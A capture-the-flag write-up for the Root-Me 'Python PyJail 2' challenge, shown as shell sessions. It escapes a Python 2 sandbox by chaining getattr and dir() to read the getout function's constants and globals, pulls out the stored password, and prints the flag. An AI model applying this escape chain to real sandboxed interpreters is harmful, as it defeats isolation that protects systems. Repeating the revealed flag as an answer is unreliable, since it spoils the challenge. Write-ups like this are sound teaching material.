# Python Pyjail 2

URL: [https://www.root-me.org/en/Challenges/App-Script/Python-PyJail-2](https://www.root-me.org/en/Challenges/App-Script/Python-PyJail-2)

## Statement

Retrieve the validation password and get out of this jail.
## Challenge connection informations

| Key        | Value                                                                                                                                                                                                                                                                                                                           |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                         |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                             |
| Port       | 2222                                                                                                                                                                                                                                                                                                                            |
| SSH access | [ssh -p 2222 app-script-ch9@challenge02.root-me.org](ssh://app-script-ch9:app-script-ch9@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_634&ssh=ssh://app-script-ch9:app-script-ch9@challenge02 "WebSSH") |
| Username   | app-script-ch9                                                                                                                                                                                                                                                                                                                  |
| Password   | app-script-ch9                                                                                                                                                                                                                                                                                                                  |
## Solution

```bash
➜ ssh -p 2222 app-script-ch9@challenge02.root-me.org
                     __     _ __
       ___  __ ____ / /__ _(_) /        Welcome on PyJail2
      / _ \/ // / // / _ `/ / /
     / .__/\_, /\___/\_,_/_/_/          Use getout() function if you want to
    /_/   /___/                         escape from here and get the flag !

>>> print 1 + 1
2
```

We are still in Python 2 and have to use `getout` function to get flag...

```bash
>>> getout()
Error: getout()
>>> getout(1)
Hum ... no.
>>> getout(1,2,3)
Error: getout(1,2,3)
>>> getout.func_code.co_consts
You're in jail dude ... Did you expect to have the key ?
```

Same trick from PyJail1 doesn't work. The getout function wants an argument which probably is the key..

We can use `getattr` method to access the values without dot notation and we can use strings in `dir` to bypass the quotes. 
```python
dir(getout)[-6] == 'func_code'
dir(getout.func_code)[-11] == 'co_consts'
func_code=getattr(getout, 'func_code')
co_consts=getattr(cd, dir(cd)[3])
print dir(co)
```

We can't declare variables, so we gotta golf it.

```python
>>> print getattr(getattr(getout, dir(getout)[-6]), dir(getattr(getout, dir(getout)[-6]))[-11])
(' check if arg is equal to the random password ', 'Well done ! Here is your so desired flag : ', 'cat .passwd', 'Hum ... no.', None)
```

From the strings the flag is probably stored somewhere in program and is being compared to `.passwd` file.

We can print the `func_globals` to reveal more information:
```python
dir(getout)[-2] == func_globals
```

```python
>>> print getattr(getout, dir(getout)[-2])
{'execute': <function execute at 0xb7bbf454>, 'random': <built-in method random of Random object at 0x83c50c>, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/challenge/app-script/ch9/ch9.py', 'cmd': <module 'cmd' from '/usr/lib/python2.7/cmd.pyc'>, '__package__': None, 'sys': <module 'sys' (built-in)>, 'passwd': 'fa2480e0888544d4c9db1531cbb7ee98', 'intro': '                     __     _ __\n       ___  __ ____ / /__ _(_) /\tWelcome on PyJail2\n      / _ \\/ // / // / _ `/ / / \n     / .__/\\_, /\\___/\\_,_/_/_/  \tUse getout() function if you want to\n    /_/   /___/
        \tescape from here and get the flag !\n', 'Jail': <class __main__.Jail at 0xb7baffbc>, '__name__': '__main__', 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, '__doc__': None, 'md5': <built-in function openssl_md5>}
```

To win we actually have to pass the password to function. Later I found variables declared are usable on single liner, chain the strings and getters and pass the password to function.

```bash
# a=dir(getout)[-2]         == 'func_globals'
# b=getattr(getout, a);     == func_globals value
# c=list(b)[7]              == 'passwd'
# d=b[c]                    == passwd value
>>> a=dir(getout)[-2];b=getattr(getout, a);c=list(b)[7];d=b[c];getout(d)
Well done ! Here is your so desired flag :
ValidateMeDude!
```

::: tip Flag
`ValidateMeDude!`
:::

